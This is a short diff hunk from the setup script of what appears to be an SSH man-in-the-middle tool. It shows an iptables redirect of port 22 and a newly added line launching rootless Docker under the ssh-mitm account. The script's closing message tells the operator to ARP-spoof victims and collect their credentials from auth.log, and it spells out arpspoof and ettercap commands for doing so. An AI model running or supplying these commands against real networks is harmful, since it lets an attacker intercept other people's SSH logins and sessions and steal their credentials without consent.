@@ -51,5 +51,7 @@ if [[ $? != 0 ]]; then
     iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222
 fi
 
+/bin/su - ssh-mitm -c "export XDG_RUNTIME_DIR=~/.docker/run; /usr/bin/dockerd-rootless.sh > ~/.docker/dockerd.log 2>&1 &"
+
 echo -e "\n\nDone!  Now ARP spoof your victims and watch /var/log/auth.log for credentials.  Logged sessions will be in /home/ssh-mitm/.  Hint: ARP spoofing can either be done with:\n\n\tarpspoof -r -t 192.168.x.1 192.168.x.5\n\n\t\tOR\n\n\tettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//\n\nIf you don't have a list of targets yet, run stop.sh and use JoesAwesomeSSHMITMVictimFinder.py to find them.  Then run this script again.\n"
 exit 0
